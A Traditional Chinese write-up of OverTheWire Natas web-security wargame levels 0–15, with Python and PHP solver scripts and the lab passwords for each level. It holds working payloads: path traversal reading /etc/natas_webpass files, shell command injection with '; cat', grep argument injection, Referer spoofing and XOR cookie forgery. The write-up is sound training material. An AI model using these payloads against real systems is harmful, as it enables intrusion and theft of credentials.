---
title: Natas
tags: OverTheWire
lang: zh-tw
---

<style>
.bigTitle{
    color: #FAD47D;
}
</style>

{%hackmd theme-dark %}

# 我使用的編輯器
- [hackmd](https://hackmd.io)
- [用hackmd看我的筆記](https://hackmd.io/@CHUNG-JUI-HE/H1djcfw0_)

# OTW Natas write up
:::info
> [name=hehank][time=Jul 24, 2021][name=UpdateAt][time=Aug 22, 2021][color=#7EDBFF]
:::

這是練習OverTheWire的Natas的筆記 && 解題方法，我會把下一關的password寫成Flag

[TOC]

# <span class="bigTitle">如何開始</span>
- 每個Level都會有一個URL，直接連進去，然後登入就可以開始了
- 要找到下一關的Password
- 只有Level0會給你username && password，其他的只有username
- 每一關的密碼都存在 =="/etc/natas_webpass/natas{Level}"==

# <span class="bigTitle">Level0</span>
- username: natas0
- password: natas0
- url: http://natas0.natas.labs.overthewire.org/
- Solution
    - 看source code
        - Broswer(FireFox) :
            - 用broswer的快捷鍵==F12==，就可以看到Flag了
            - 也可以用右鍵點查看原始碼
                ![](https://i.imgur.com/e3GRXih.png)
        - Python :
            - 直接抓取web page的source code，然後再用regular expression搜Flag
                ```python=
                #! /usr/bin/env python3
                # coding=utf-8
            
                import requests as req
                import re

                user = "natas0"
                passwd = user

                url = "http://%s.natas.labs.overthewire.org" % user

                response = req.get(url, auth=(user, passwd))
                content = response.text
        
                # . => 在 default 模式，匹配除了'\n'的任意字符。
                # * => 對它前面的 regular expression 匹配 0 到任意次重復。
                answer = re.findall("<!--The password for natas1 is (.*) -->", content)[0]

                # with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
                    # print(content, file=f)
            
                print(answer)
                ```

# <span class="bigTitle">Level1</span>
- username: natas1
- password: gtVrDuiDfck831PqWsLEZy5gyDz1clto
- url: http://natas1.natas.labs.overthewire.org
- Solution
    - 解法跟Level0一樣，只是在白色的background下沒辦法按右鍵
    - python code只要改：
        1. user
        2. passwd
        3. .findall中你要搜尋的字串

# <span class="bigTitle">Level2</span>
- username: natas2
- password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
- url: http://natas2.natas.labs.overthewire.org/
- Solution
    - 連進去之後發現Flag並沒有在source code中，但是可以看到==pixel.png== 的source是files這個directory，就試著連進去看看
        ![](https://i.imgur.com/ZNQC5Ka.png)
    - 還真的連進去了:smile:，點進去users.txt，就會看到Flag了
        ![](https://i.imgur.com/DZ33VnD.png)
        ![](https://i.imgur.com/rBIXzoz.png)
    - Python :
        ```python=
        #! /usr/bin/env python3
        # coding=utf-8

        import requests as req
        import re

        user = "natas2"
        passwd = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

        url = "http://%s.natas.labs.overthewire.org/files/users.txt" % user

        response = req.get(url, auth=(user, passwd))
        content = response.text

        # . => 在 default 模式，匹配除了'\n'的任意字符。
        # * => 對它前面的 regular expression 匹配 0 到任意次重復。
        answer = re.findall("natas3:(.*)", content)[0]
        # with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
        #     print(content, file=f)

        print(answer)
        ```

# <span class="bigTitle">Level3</span>
- username: natas3
- password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
- url: http://natas3.natas.labs.overthewire.org/
- Solution
    - 先去看一下source code，會看到這樣一行註解文字
        ![](https://i.imgur.com/jK7kRUx.png)
    - 看得出來可能跟Google有些關係，網站可能會有robots.txt檔，這個檔是用來限制Googlebot可以存取往站上的哪些網址
        - :point_right: [introduce_robots.txt](https://developers.google.com/search/docs/advanced/robots/intro?hl=zh-tw)
        ![](https://i.imgur.com/9LafL48.png)
    - 就會看到一個奇怪的資料夾名字，連進去就對了
        ![](https://i.imgur.com/NsZl5lK.png)
    - 可以看到是跟Level2一樣的files，只是名字不同，然後在進去users.txt就找到Flag了
        ![](https://i.imgur.com/uN2pesd.png)
    - Python :
        ```python=
        #! /usr/bin/env python3
        # coding=utf-8

        import requests as req
        import re

        user = "natas3"
        passwd = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"

        url = "http://%s.natas.labs.overthewire.org/s3cr3t/users.txt" % user

        response = req.get(url, auth=(user, passwd))
        content = response.text

        # . => 在 default 模式，匹配除了'\n'的任意字符。
        # * => 對它前面的 regular expression 匹配 0 到任意次重復。
        answer = re.findall("natas4:(.*)", content)[0]

        # with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
            # print(content, file=f)

        print(answer)
        ```

# <span class="bigTitle">Level4</span>
- username: natas4
- password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
- url: http://natas4.natas.labs.overthewire.org/
- Solution
    - 這題一進去頁面會看到==不允許權限==，只允許來自Natas5的web page
        ![](https://i.imgur.com/GtjMZbD.png)
    - 那就得要讓web page的來源是Natas5，就要在request headers中==增加/修改Referer==，就可以取得權限，就可以看到Flag了
        - [introduce_Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
        - borswer(FireFox) :
            - 去==F12==的==網路==，在我選取的那個封包點右鍵，按編輯並重新傳送
                ![](https://i.imgur.com/nD05f9L.png)
            - 在request headers中更改/新增Referer
                ![](https://i.imgur.com/wUOFEZc.png)
            - 送出之後就會在你剛剛送出的封包的response裡面看到Flag
                ![](https://i.imgur.com/drs1uXW.png)
        - Python :
            ```python=
            #! /usr/bin/env python3
            # coding=utf-8

            import requests as req
            import re

            user = "natas4"
            passwd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

            url = "http://%s.natas.labs.overthewire.org/" % user

            # Referer => 發送 request headers 時，用於指定當前 web page 的前一個的 web page 的來源網址
            headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

            # headers = headers => 將剛剛的 Referer 加入 get 請求中
            response = req.get(url, auth=(user, passwd), headers=headers)
            content = response.text

            # . => 在 default 模式，匹配除了'\n'的任意字符。
            # * => 對它前面的 regular expression 匹配 0 到任意次重復。
            answer = re.findall("The password for natas5 is (.*)", content)[0]

            # with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
            #     print(content, file=f)

            print(answer)
            ```

# <span class="bigTitle">Level5</span>
- username: natas5
- password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
- url: http://natas5.natas.labs.overthewire.org/
- Solution
    - 一開始登進去會看到頁面顯示沒有登入，那一開始我們已經登入了，那就有可能是cookies裡面沒有紀錄我已經登入的訊息
        ![](https://i.imgur.com/tu3YBRO.png)
    - 就先去看看這個web page的cookies，發現有一個叫==logged in==的value是0
        ![](https://i.imgur.com/41Z9jmU.png)
    - Broswer(FireFox) :
        - 就把它的value改成1(代表已經登入)就可以取得Flag了
            ![](https://i.imgur.com/wIh04Tx.png)
    - Python :
        ```python=
        #! /usr/bin/env python3
        # coding=utf-8

        import requests as req
        import re

        from requests.sessions import session

        user = "natas5"
        passwd = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

        url = "http://%s.natas.labs.overthewire.org/" % user
        
        cookies = {'loggedin': '1'}
        
        response = req.get(url, auth=(user, passwd), cookies=cookies)
        
        # TODO: 看此網站的 cookies
        # content = response.cookies
        
        content = response.text
        
        answer = re.findall("The password for natas6 is(.*)</div>", content)[0]
        print(answer)
        ```

# <span class="bigTitle">Level6</span>
- username: natas6
- password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
- url: http://natas6.natas.labs.overthewire.org/
- Solution
    - 一開始我直接去看題目中的textbox的source code，發現你輸入的東西會用POST method 將你輸入的東西submit到後端，然後再去看後端的source code(點View sourcecode)
        ![](https://i.imgur.com/E8XIVzT.png)
    - 然後就會看到這段PHP code，它就是如何判斷你輸入的字串有沒有跟原本的&#36;secret一樣，要true才會出現Flag，然後又發現這段code中有include一個叫做secret.inc的檔案，連進去就會看到&#36;secret的value
        ![](https://i.imgur.com/UqsxeBb.png)
    - 再把它輸入到textbox裡面submit出去，就可以得到Flag了
        ![](https://i.imgur.com/YmI43Tt.png)
        ![](https://i.imgur.com/NlXL9bj.png)
        ![](https://i.imgur.com/LuQOqFn.png)
    - Python :
        ```python=
        #! /usr/bin/env python3
		# -*- coding: utf-8 -*-

		import requests as req
		import re

		user = "natas6"
		passwd = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

		url = "http://%s.natas.labs.overthewire.org/" % user

		# 使用 ppst method 時要加入的變數
		data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}

		# post method
		response = req.post(url, data=data, auth=(user, passwd))
		content = response.text

		# . => 在 default 模式，匹配除了'\n'的任意字符。
		# * => 對它前面的 regular expression 匹配 0 到任意次重復。
		answer = re.findall(
            "Access granted. The password for natas7 is (.*)", content)[0]

		# with open("./Natas/response.html", mode='w', encoding='utf-8')as f:
		#     print(content, file=f)

		print(answer)
        ```

# <span class="bigTitle">Level7</span>
- username: natas7
- password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
- url: http://natas7.natas.labs.overthewire.org/
- Solution
    - 連進去web page就看到兩個連結，一個是到home、一個是到about，然後我看到source code中有一行comment如下圖二
        - 圖一
            ![](https://i.imgur.com/SKDSuSm.png)
        - 圖二
            ![](https://i.imgur.com/PrjoEjV.png)
    - 一開始我直接嘗試用{&#46;&#46;&#47;}來連進去有Flag的頁面，結果直接404
        ![](https://i.imgur.com/IJWbkCj.png)
    - 後來看到連過去home或about會用到page這個variable，結果直接讓page等於有Flag的web page就可以看到Flag了
        ![](https://i.imgur.com/3XB5UhF.png)
    - Python :
        ```python=
        #! /usr/bin/env python3
        # coding=utf-8

        import requests as req
        import re

        user = "natas7"
        passwd = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

        url = "http://%s.natas.labs.overthewire.org/" % user

        # 使用 get method 時要加入的變數
        params = {'page': '../../../../../etc/natas_webpass/natas8'}

        # get method
        response = req.get(url, auth=(user, passwd), params=params)
        content = response.text

        # . => 在 default 模式，匹配除了'\n'的任意字符。
        # * => 對它前面的 regular expression 匹配 0 到任意次重復。
        answer = re.findall("<br>\n(.*)\n\n<!--", content)[0]

        # with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
        #     print(content, file=f)

        print(answer)
        ```

# <span class="bigTitle">Level8</span>
- username: natas8
- password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
- url: http://natas8.natas.labs.overthewire.org/
- Solution
    - 這題長的跟Level6一模一樣，只有Source code不一樣，這題的Source code如下所示，主要是要把cipherText decode成cheaperText，這個cheaperText就是\$encodedSecret的明碼
        ![](https://i.imgur.com/ElDXmMc.png)
    - 看Source code就知道用了base64、string reverse跟bin to hex，可以跟題目一樣用PHP轉，也可以用python(你只要會都可以)
        - PHP :
            ```php=
            #!/usr/bin/php

            <?php
                $cipher = '3d3d516343746d4d6d6c315669563362';
                $cheapText = base64_decode(strrev(hex2bin($cipher)));
                echo $cheapText;
            ?>
            ```
        - Python :
            ```python=
            import base64

            def decodeSecret(secret):
                # hex => text
                cheapText = (bytes.fromhex(secret)).decode('utf-8')
                # string reverse
                cheapText = cheapText[::-1]
                # base64 decode
                cheapText = base64.b64decode(cheapText).decode('utf-8')
                return cheapText

            if __name__ == "__main__":
                # test
                cipher = decodeSecret('3d3d516343746d4d6d6c315669563362')
                print(cipher)
            ```
    - 然後將decode完的明碼submit出去，就可以得到Flag
        - Broswer(FireFox)
            ![](https://i.imgur.com/Dcz5iH1.png)
            ![](https://i.imgur.com/Q9DXbLe.png)
        - Python :
            ```python=
            #! /usr/bin/env python3
            # coding=utf-8
            
            # L8_decode 是上面python的decode的檔案
			import L8_decode
			import re
			import requests as req
			
			user = "natas8"
			passwd = "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe"
			
			# TODO: 抓取 Source code & decode text
			# ViewSourceCode = "index-source.html"
			
			# url = f"http://{user}.natas.labs.overthewire.org			/{ViewSourceCode}"
			
			# response = req.get(url, auth=(user, passwd))
			# content = response.text
			
			# with open("Natas/response.html", "w") as f:
			#     print(content, file=f)
			
			cipher = "3d3d516343746d4d6d6c315669563362"
			cheaperText = L8_decode.decodeSecret(cipher)
			
			# TODO: 使用 POST method 取得 Flag
			
			url = f"http://{user}.natas.labs.overthewire.org/"

			data = {'secret': cheaperText, 'submit': 'submit'}

			response = req.post(url, auth=(user, passwd), data=data)
			content = response.text

			# with open("Natas/response.html", "w") as f:
			#     print(content, file=f)

			answer = re.findall(
                "Access granted. The password for natas9 is (.*)\n", content)[0]
			print(answer)
            ```

# <span class="bigTitle">Level9</span>
- username: natas9
- password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
- url: http://natas9.natas.labs.overthewire.org/
- Solution
    - 當你看到這題的source code後就會發現這題是command injection，那這題什麼東西都沒擋，就很簡單，直接讓對方 ==cat== 出 ==/etc/natas_webpass/natas10== 的內容就可以了
        - Broswer(FireFox) :
            - source code :
                ![](https://i.imgur.com/0pcH8Ii.png)
            - 如何讓對方輸出Flag
                ![](https://i.imgur.com/oxb1Inc.png)
                - 我輸入的東東 ：
                    ```bash=
                    # # => 把後面註解掉，所以就只會出現Flag(可加可不加)
                    # . => regex的搜尋所有的字，除了"\n"
                    .; cat /etc/natas_webpass/natas10 #
                    ```
                ![](https://i.imgur.com/Sa4QcBz.png)
        - Python :
            ```python=
            #! /usr/bin/env python3
			# -*- coding: utf-8 -*-

			import requests as req
			import re

			user = "natas9"
			passwd = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

			viewSourceCode = 'index-source.html'

			params = {"needle": ".; cat /etc/natas_webpass/natas10 #", "submit": "submit"}

			url = f"http://{user}.natas.labs.overthewire.org/"

			response = req.get(url, auth=(user, passwd), params=params)
			content = response.text

			# . => 在 default 模式，匹配除了'\n'的任意字符。
			# * => 對它前面的 regular expression 匹配 0 到任意次重復。

			# with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
			#     print(content, file=f)

			answer = re.findall("<pre>\n(.*)\n", content)[0]
			print(answer)
            ```

# <span class="bigTitle">Level10</span>
- username: natas10
- password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
- url: http://natas10.natas.labs.overthewire.org/
- Solution
    - 這題跟Level9很像，只是這題有擋一些字串，那這題其實可以用grep的一些方法來讓它output ==/etc/natas_webpass/natas11== 的內容
    - source code
        ![](https://i.imgur.com/CYAVhNf.png)
    - 讓grep一次搜尋多個檔案
        ```bash=
        grep [Options] Patterns [File] [File]....
        # 我輸入的內容
        . /etc/natas_webpass/natas11 #
        ```
    - Python code其實跟上一題很像只要改 :
        1. user
        2. passwd
        3. params中needle的value
        4. .findall中要搜尋的string

# <span class="bigTitle">Level11</span>
- username: natas11
- password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
- url: http://natas11.natas.labs.overthewire.org/
- Solution
    - 這題是cookies的漏洞，但是它的cookies的data經過了xor encrypt，所以要先把data decrypt xor，才能改cookies，因為要丟上去的data還是要經過xor encrypt，這些可以從這題的source coed看到
        ![](https://i.imgur.com/fO1X9BI.png)
    - source code
        ![](https://i.imgur.com/8vMqDLw.png)
        ![](https://i.imgur.com/MSxuSLO.png)
    - cookies data decrypt
        ```php=
        #!/usr/bin/php

		<?php
        // ? 解xor_encrypt() key 想法
        // ? 直接用題目給的defaultdata跟cookies裡的data回推出key
		// ? cheapText ^ key = ciphertext
		// ? => cheapText ^ ciphertext = key

		function xor_encrypt($in, $key)
		{
		    $text = $in;
		    $outText = '';

		    // Iterate through each character
		    for ($i = 0; $i < strlen($text); $i++) {
		        $outText .= $text[$i] ^ $key[$i % strlen($key)];
		    }

		    return $outText;
		}

		// TODO: Test json_encode()
		$defaultdata = array("showpassword" => "no", "bgcolor" => "#ffffff");
		// echo json_encode($defaultdata);

		// TODO: Get key && test key
		$data = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
		$defaultdata = json_encode($defaultdata);
		// ? substr($str, start, length);
		$key = substr(xor_encrypt($data, $defaultdata), 0, 4);
		// $cheapText = xor_encrypt($data, $key);
		// echo $cheapText;
		// echo "\n";
		// echo $key;

		// TODO: Encrypt cheapText to cipherText
		$cheapText = json_encode(array("showpassword" => "yes", "bgcolor" => "#ffffff"));
		$cipherText = base64_encode(xor_encrypt($cheapText, $key));
		echo $cipherText;
        ```
    - 再來就是把cookies的data換成自己編輯過的那組，再重刷頁面就可以看到Flag了
        - Broswer(FireFox) :
            ![](https://i.imgur.com/G0zvW8V.png)
            ![](https://i.imgur.com/aaPA3QM.png)
        - Python : 多加了cookies參數
            ```python=
            #! /usr/bin/env python3
			# -*- coding: utf-8 -*-

			import requests as req
			import re
			import base64
			from urllib import parse


			user = "natas11"
			passwd = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
			
			viewSourceCode = 'index-source.html'

			cookies = {'data': 'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}

			url = f"http://{user}.natas.labs.overthewire.org/"

			response = req.get(url, auth=(user, passwd), cookies=cookies)

			# TODO: Get cookies
			# unquote => decode url encoded
			# content = parse.unquote(response.cookies["data"])

			# TODO: Get the answer
			content = response.text
			answer = re.findall("The password for natas12 is (.*)<br>", content)[0]
			print(answer)

			# with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
			#     print(content, file=f)
            ```

# <span class="bigTitle">Level12</span>
- username: natas12
- password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
- url: http://natas12.natas.labs.overthewire.org/
- Solution

# <span class="bigTitle">Level13</span>
- username: natas13
- password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
- url: http://natas13.natas.labs.overthewire.org/
- Solution

# <span class="bigTitle">Level14</span>
- username: natas14
- password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
- url: http://natas14.natas.labs.overthewire.org/
- Solution

# <span class="bigTitle">Level15</span>
- username: natas15
- password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
- url: http://natas15.natas.labs.overthewire.org/
- Solution